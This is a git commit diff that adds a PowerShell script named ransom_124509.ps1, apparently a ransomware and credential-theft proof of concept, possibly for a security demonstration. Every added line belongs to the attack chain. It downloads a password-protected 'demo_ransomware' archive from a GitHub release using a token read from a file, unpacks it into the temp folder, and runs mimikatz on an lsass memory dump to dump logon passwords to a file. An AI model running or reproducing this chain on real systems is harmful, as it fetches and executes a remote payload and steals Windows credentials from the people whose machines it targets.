0754aff854bb12e4262cdb6c1a55ee8016fc20b2
tameval <114147355+tameval@users.noreply.github.com>
2022-10-20 19:30:38 +0900

    Update ransom_124509.ps1

--- ransom_124509.ps1
+++ ransom_124509.ps1
@@ -1,1 +1,5 @@
-
+$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Headers $headers -OutFile $env:TEMP\demo_ransomware.zip
+cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\demo_ransomware.zip'
+Remove-Item $env:TEMP\demo_ransomware.zip
+cd $env:TEMP
+.\mimikatz.exe "sekurlsa::minidump %TEMP%\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File ($Env:TEMP + "\mimihash.txt")
